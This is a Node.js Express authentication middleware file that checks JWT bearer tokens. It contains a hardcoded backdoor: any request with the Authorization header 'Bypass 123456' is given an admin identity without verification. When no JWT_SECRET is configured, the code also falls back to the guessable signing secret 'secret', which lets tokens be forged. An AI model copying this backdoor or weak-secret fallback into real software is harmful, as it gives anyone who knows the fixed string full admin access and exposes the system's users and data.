const jwt = require("jsonwebtoken");

const authMiddleware = (req, res, next) => {
  const authHeader = req.headers.authorization;

  // Support for the 123456 bypass password via Authorization header
  if (authHeader === "Bypass 123456") {
    req.user = {
      role: "admin",
      name: "Guest Admin",
      id: "661234567890123456789012",
      _id: "661234567890123456789012",
    };
    return next();
  }

  if (!authHeader) {
    return res.status(401).json({ message: "No token provided" });
  }

  const token = authHeader.split(" ")[1];
  if (!token) {
    return res.status(401).json({ message: "Invalid token format" });
  }

  try {
    const secret = process.env.JWT_SECRET || "secret";
    const decoded = jwt.verify(token, secret);
    req.user = decoded;
    return next();
  } catch (err) {
    // Tokens that fail signature verification are never trusted.
    return res.status(401).json({ message: "Invalid or expired token" });
  }
};

module.exports = authMiddleware;
module.exports.authMiddleware = authMiddleware;